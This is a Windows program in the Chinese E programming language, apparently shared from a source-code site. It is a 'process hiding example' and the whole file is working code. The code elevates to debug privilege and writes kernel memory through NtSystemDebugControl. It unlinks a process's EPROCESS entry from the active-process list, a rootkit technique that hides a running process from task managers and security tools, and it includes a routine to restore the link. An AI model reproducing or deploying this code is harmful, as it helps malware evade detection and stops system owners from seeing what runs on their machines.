 ' 文件类型：Windows控制台程序

 ' 程序名称：
 ' 程序描述：
 ' 程序作者：本源码来自三叶资源网(www.sanye.cx)
 ' 邮政编码：
 ' 联系地址：本源码来自三叶资源网(www.sanye.cx)
 ' 联系电话：
 ' 传真号码：
 ' 电子信箱：
 ' 主页地址：
 ' 版权声明：本源码来自三叶资源网(www.sanye.cx)
 ' 版本号：1.0
 ' 创建号：0.0

窗口 _启动窗口 ' 在程序启动后自动调入本窗口
    左边 = 50
    顶边 = 50
    宽度 = 190
    高度 = 199
    鼠标指针 = { 0,0,0,0 }
    标记 = “”
    可视 = 真
    禁止 = 假
    边框 = 2
    底图方式 = 1
    底色 = -16777216 '  0xFF000000
    最大化按钮 = 假
    最小化按钮 = 假
    控制按钮 = 真
    位置 = 1
    可否移动 = 真
    背景音乐播放次数 = 0
    回车下移焦点 = 假
    Esc键关闭 = 真
    F1键打开帮助 = 假
    帮助标志值 = 0
    在任务栏中显示 = 真
    随意移动 = 假
    外形 = 0
    总在最前 = 假
    保持标题栏激活 = 假
    窗口类名 = “”
    底图 =  ' 空
    图标 =  ' 空
    背景音乐 =  ' 空
    标题 = “进程隐藏示例”
    帮助文件名 = “”





 ' 所需要的支持库：
 ' krnln d09f2340818511d396f6aaf844c7e325 5 3 系统核心支持库




数据类型 ebw4ythr, , 进程令牌
    .成员 s5hyb5r, 整数型, , , 
    .成员 xsd65byf, 整数型, , , 

数据类型 ebyrt, , From:AdjustTokenPrivileges
    .成员 sd5gtyv, 整数型, , , 
    .成员 sr5ybcthf, 整数型, , , 
    .成员 iund6gvry, 整数型, , , 
    .成员 sv45y, 整数型, , , 

数据类型 h4e6hhtrdes, , 
    .成员 a, 整数型, , , 
    .成员 b, 字节型, , , 
    .成员 c, 字节型, , , 
    .成员 d, 短整数型, , , 
    .成员 e, 整数型, , , 
    .成员 f, 整数型, , , 

数据类型 xbsdy5sg, , ITEMIDLIST
    .成员 xzsybd, 整数型, , , cb
    .成员 xyvy, 字节型, , "255", abID


.DLL命令 _打开进程, 整数型, "", "OpenProcess", , kernel32.dll
    .参数 访问级别, 整数型, , 2035711完全访问
    .参数 子进程继承, 整数型, , 0为子进程继承
    .参数 进程ID, 整数型, , 要打开的进程标识

.DLL命令 _关闭对象, 整数型, "", "CloseHandle", 公开, kernel32.dll
    .参数 对象句柄, 整数型, , 

.DLL命令 _取自进程ID, 整数型, "", "GetCurrentProcessId", 公开, kernel32.dll

.DLL命令 获取特别文件夹位置_, 整数型, "", "SHGetSpecialFolderLocation", , shell32.dll
    .参数 窗口句柄, 整数型, , hwndOwner
    .参数 文件夹位置, 整数型, , nFolder
    .参数 结构, xbsdy5sg, 传址, pIdl

.DLL命令 从列表id取路径_, 整数型, "", "SHGetPathFromIDListA", , shell32.dll
    .参数 结构指针, 整数型, , pIdl
    .参数 路径, 文本型, 传址, pszPath

.DLL命令 _取指针_字节集, 整数型, "", "lstrcpyn", , 
    .参数 目的指针, 字节集, 传址, 
    .参数 源指针, 字节集, 传址, 
    .参数 复制长度, 整数型, , 0

.DLL命令 NtSystemDebugControl, 整数型, "", "NtSystemDebugControl", , ntdll.dll
    .参数 Command, 整数型, , 8
    .参数 InputBuffer, 字节集, , 
    .参数 InputBufferLength, 整数型, , 
    .参数 OutputBuffer, 整数型, , 
    .参数 OutputBufferLength, 整数型, , 
    .参数 ReturnLength, 整数型, 传址, 

.DLL命令 ZwQuerySystemInformation, 整数型, "", "ZwQuerySystemInformation", , ntdll.dll
    .参数 SystemInformationClass, 整数型, , 未知类型：SYSTEM_INFORMATION_CLASS。
    .参数 SystemInformation, 字节集, , any
    .参数 SystemInformationLength, 整数型, , 
    .参数 ReturnLength, 整数型, 传址, 

.DLL命令 _写内存3, 整数型, "", "RtlMoveMemory", , 
    .参数 dest, 整数型, 传址, 
    .参数 Source, 整数型, , 
    .参数 len, 整数型, , 4

.DLL命令 _写内存2, 整数型, "", "RtlMoveMemory", , 
    .参数 dest, h4e6hhtrdes, , 
    .参数 Source, 整数型, , 
    .参数 len, 空白型, , 284

.DLL命令 _进制文本转整数, 整数型, "", "StrToInt64ExA", , shlwapi.dll进制文本转整数_64-bit integer
    .参数 pszString, 文本型, , 
    .参数 dwFlags, 整数型, , 
    .参数 piRet, 长整数型, 传址, 

.DLL命令 _打开令牌对象, 逻辑型, "", "OpenProcessToken", , advapi32.dll打开过程令牌对象
    .参数 进程句柄, 整数型, , 
    .参数 权限, 整数型, , 
    .参数 令牌句柄, 整数型, 传址, 

.DLL命令 _取权限令牌, 整数型, "", "LookupPrivilegeValueA", , advapi32.dll返回特权名LUID
    .参数 系统服务名, 整数型, , lpSystemName
    .参数 权限名, 文本型, 传址, 
    .参数 权限结构, ebw4ythr, 传址, 

.DLL命令 _置进程权限, 逻辑型, "", "AdjustTokenPrivileges", , advapi32.dll使能/取消令牌特权
    .参数 令牌句柄, 整数型, , 
    .参数 DisableAllPrivileges, 逻辑型, , 
    .参数 NewState, ebyrt, 传址, 
    .参数 BufferLength, 整数型, , 
    .参数 PreviousState, 整数型, , 
    .参数 ReturnLength, 整数型, , 

.窗口程序集 窗口程序集1, , , 

.程序集变量 返回链表值, 整数型, , , 
.子程序 _按钮1_被单击, 空白型, , 
赋值 (返回链表值, 进程隐藏 ())
.如果 (等于 (返回链表值, -1))
    信息框 (“隐藏进程失败。”, 48, “信息提示”)
.否则
    信息框 (“隐藏进程成功。”, 64, “信息提示”)
.如果结束


.子程序 _按钮2_被单击, 空白型, , 
赋值 (返回链表值, 进程隐藏 (返回链表值))
.如果 (等于 (返回链表值, -1))
    信息框 (“显示隐藏的进程失败。”, 48, “信息提示”)
.否则
    信息框 (“显示隐藏的进程成功。”, 64, “信息提示”)
.如果结束


.子程序 进程隐藏, 整数型, , 通过断链方式隐藏进程(返回链表值,用于恢复该进程,失败返回-1)
.参数 进程ID, 整数型, 可空, 目的进程ID (默认自进程ID)
.参数 链表值, 整数型, 可空, 欲还原的进程链表地址值  如果隐藏进程请留空

.局部变量 eprocess, 长整数型, , , 
.局部变量 hand, 整数型, , , 
.局部变量 temp, 字节集, , , 
.局部变量 fw_, 长整数型, , , 
.局部变量 bw_, 长整数型, , , 
.局部变量 fw, 字节集, , , 
.局部变量 bw, 字节集, , , 
.局部变量 返回值, 整数型, , , 

.如果真 (等于 (提升进程权限D (), 假))
    返回 (-1)
.如果真结束
 ' 本源码来自三叶资源网(www.sanye.cx)
.如果 (是否为空 (进程ID))
    赋值 (hand, _打开进程 (2075311, 0, _取自进程ID ()))
    赋值 (eprocess, 取进程EProcess (_取自进程ID ()))
    _关闭对象 (hand)
.否则
    赋值 (eprocess, 取进程EProcess (进程ID))
.如果结束

.如果真 (等于 (eprocess, 0))
    返回 (-1)
.如果真结束
赋值 (temp, 读物理内存 (相加 (eprocess, 136), 4))
.如果真 (等于 (temp, {  }))
    返回 (-1)
.如果真结束
赋值 (fw_, 取字节集数据 (temp, 4, ))
赋值 (fw, temp)
赋值 (temp, 读物理内存 (相加 (eprocess, 140), 4))
.如果真 (等于 (temp, {  }))
    返回 (-1)
.如果真结束
赋值 (bw_, 取字节集数据 (temp, 4, ))
赋值 (bw, temp)
赋值 (返回值, 取字节集数据 (读物理内存 (bw_, 4), 3, ))
.如果 (是否为空 (链表值))
    .如果真 (等于 (写物理内存 (相加 (fw_, 4), bw), -1))
        返回 (-1)
    .如果真结束
     ' 本源码来自三叶资源网(www.sanye.cx)
    .如果真 (等于 (写物理内存 (bw_, fw), -1))
        返回 (-1)
    .如果真结束
    
.否则
    .如果真 (等于 (写物理内存 (相加 (fw_, 4), 到字节集 (链表值)), -1))
        返回 (-1)
    .如果真结束
    
    .如果真 (等于 (写物理内存 (bw_, 到字节集 (链表值)), -1))
        返回 (-1)
    .如果真结束
    
.如果结束
返回 (返回值)

.子程序 提升进程权限D, 逻辑型, , 成功返回真，把一个进程的权限提升到调试级权限
.参数 进程ID, 整数型, 可空, 可空为提升当前进程

.局部变量 进程句柄, 整数型, , , 
.局部变量 令牌句柄, 整数型, , , 
.局部变量 destLuid, ebw4ythr, , , 
.局部变量 进程权限, ebyrt, , , 
.局部变量 返回值, 逻辑型, , , 

.如果真 (是否为空 (进程ID))
    赋值 (进程ID, _取自进程ID ())
.如果真结束
赋值 (进程句柄, _打开进程 (2035711, 0, 进程ID))
_打开令牌对象 (进程句柄, 983551, 令牌句柄)
_取权限令牌 (0, “SeDebugPrivilege”, destLuid)
赋值 (进程权限.sd5gtyv, 1)
赋值 (进程权限.sv45y, 2)
赋值 (进程权限.sr5ybcthf, destLuid.s5hyb5r)
赋值 (进程权限.iund6gvry, destLuid.xsd65byf)
赋值 (返回值, _置进程权限 (令牌句柄, 假, 进程权限, 0, 0, 0))
_关闭对象 (进程句柄)
返回 (返回值) ' 本源码来自三叶资源网(www.sanye.cx)

.子程序 取进程EProcess, 长整数型, , 0为失败(进程隐藏)
.参数 pid, 整数型, , 

.局部变量 ret, 空白型, , , 
.局部变量 信息块, 字节集, , , 
.局部变量 retlen, 空白型, , , 
.局部变量 temp, h4e6hhtrdes, , , 
.局部变量 信息块指针偏移, 空白型, , , 
.局部变量 number, 空白型, , , 
.局部变量 结果, 长整数型, , , 

赋值 (retlen, 1)
.循环判断首 ()
    赋值 (信息块, 取空白字节集 (retlen))
    _模块_调用转向 (“ntdll.dll”, “ZwQuerySystemInformation”)
    赋值 (ret, ZwQuerySystemInformation (16, 信息块, retlen, 0))
    .如果 (等于 (ret, -1073741820))
        赋值 (retlen, 相乘 (retlen, 2))
        赋值 (信息块, 取空白字节集 (retlen))
    .否则
        跳出循环 ()
    .如果结束
     ' 本源码来自三叶资源网(www.sanye.cx)
.循环判断尾 (等于 (ret, -1073741820))
赋值 (信息块指针偏移, _取指针_字节集 (信息块, 信息块, 0))
_写内存3 (number, 信息块指针偏移, 4)
赋值 (信息块指针偏移, 相加 (信息块指针偏移, 4))
.计次循环首 (number, )
    _写内存2 (temp, 信息块指针偏移, 16)
    .如果真 (并且 (等于 (pid, temp.a), 等于 (temp.b, 5)))
        返回 (十六文本至长整数 (取十六进制文本 (temp.e)))
    .如果真结束
    赋值 (信息块指针偏移, 相加 (信息块指针偏移, 16))
.计次循环尾 ()
返回 (0)

.子程序 十六文本至长整数, 长整数型, , (进程隐藏)
.参数 x, 文本型, , 要转换的十六进制文本

.局部变量 ret, 长整数型, , , 

_模块_调用转向 (“shlwapi.dll”, “StrToInt64ExA”)
_进制文本转整数 (相加 (“0x”, x), 1, ret)
返回 (ret)

.子程序 读物理内存, 字节集, , 失败返回{}，成功返回相应数据 (进程隐藏)
.参数 地址, 长整数型, , 
.参数 长度, 整数型, , <=4096

.局部变量 MEMORY_CHUNKS, 字节集, , , 
.局部变量 ret, 字节集, , , 
.局部变量 retlen, 整数型, , , 

赋值 (ret, 取空白字节集 (长度))
赋值 (MEMORY_CHUNKS, 相加 (取字节集左边 (到字节集 (地址), 4), 到字节集 (_取指针_字节集 (ret, ret, 0)), 到字节集 (长度)))
_模块_调用转向 (“ntdll.dll”, “NtSystemDebugControl”)
NtSystemDebugControl (8, MEMORY_CHUNKS, 12, 0, 0, retlen) ' 12为MEMORY_CHUNKS的长度
.如果真 (小于或等于 (retlen, 0))
    赋值 (ret, {  })
.如果真结束
返回 (ret) ' 本源码来自三叶资源网(www.sanye.cx)

.子程序 写物理内存, 整数型, , 失败返回-1，成功返回0 (进程隐藏)
.参数 地址, 长整数型, , 
.参数 数据, 字节集, , <=4096

.局部变量 MEMORY_CHUNKS, 字节集, , , 
.局部变量 ret, 整数型, , , 
.局部变量 retlen, 整数型, , , 
.局部变量 len, 整数型, , , 

赋值 (len, 取字节集长度 (数据))
赋值 (MEMORY_CHUNKS, 相加 (取字节集左边 (到字节集 (地址), 4), 到字节集 (_取指针_字节集 (数据, 数据, 0)), 到字节集 (len)))
_模块_调用转向 (“ntdll.dll”, “NtSystemDebugControl”)
NtSystemDebugControl (9, MEMORY_CHUNKS, 12, 0, 0, retlen) ' 12为MEMORY_CHUNKS的长度
.如果真 (小于或等于 (retlen, 0))
    赋值 (ret, -1)
.如果真结束
返回 (ret) ' 本源码来自三叶资源网(www.sanye.cx)

.子程序 _模块_调用转向, 空白型, , 
.参数 DLL文件名, 文本型, , 
.参数 函数名, 文本型, , 

.局部变量 hbe4htr, 文本型, 静态, , 
.局部变量 ye65ybtry5, 整数型, 静态, , 

.如果真 (等于 (hbe4htr, “”))
    赋值 (hbe4htr, 取特殊目录 (37))
.如果真结束
.如果真 (DLL命令调用转向 (相加 (hbe4htr, DLL文件名), 函数名))
    返回 ()
.如果真结束
信息框 (相加 (“找不到文件:”, DLL文件名, “中的函数:”, 函数名, “！”), 16, “错误提示”)
结束 ()

.子程序 取特殊目录, 文本型, , 取特定的目录(返回所要取的指定目录名 无效返回空)
.参数 欲获取目录类型, 整数型, 可空, 0我的桌面 1临时目录 5我的文档 6我的收藏夹 7我的启动 11我的开始菜单 20系统字体 36Windows安装目录 37系统目录  [99更多]

.局部变量 路径, 文本型, , , 
.局部变量 标示结构, xbsdy5sg, , , 
.局部变量 目录类型, 整数型, , , 

.如果真 (等于 (欲获取目录类型, 99))
    输出调试文本 (“0我的桌面 2我的程序 5我的文档 6我的收藏夹 7我的启动 8我最近的文档 9我的发送到 11我的开始菜单 13我的音乐 14我的视频 16我的桌面 20系统字体 22开始菜单组 23程序组 24启动组 25桌面 31收藏夹 32我的浏览器临时目录 33我的Cookies 34我的历史记录 36Windows安装目录 37系统目录 38文件安装目录 39我的图片 40用户目录 41系统目录 46文档 47管理工具 48我的管理工具 53音乐 54图片 55视频”)
.如果真结束
.如果 (等于 (欲获取目录类型, 1))
    赋值 (目录类型, 34)
.否则
    赋值 (目录类型, 欲获取目录类型)
.如果结束
获取特别文件夹位置_ (0, 目录类型, 标示结构)
赋值 (路径, 取空白文本 (255))
从列表id取路径_ (标示结构.xzsybd, 路径)
.如果真 (等于 (路径, “”))
    返回 (“”)
.如果真结束
.如果真 (等于 (欲获取目录类型, 1))
    赋值 (路径, 子文本替换 (路径, “History”, “Temp”, , , 真))
.如果真结束
返回 (相加 (路径, “\”))


 ' 不属于任何一个程序集、类模块的函数：
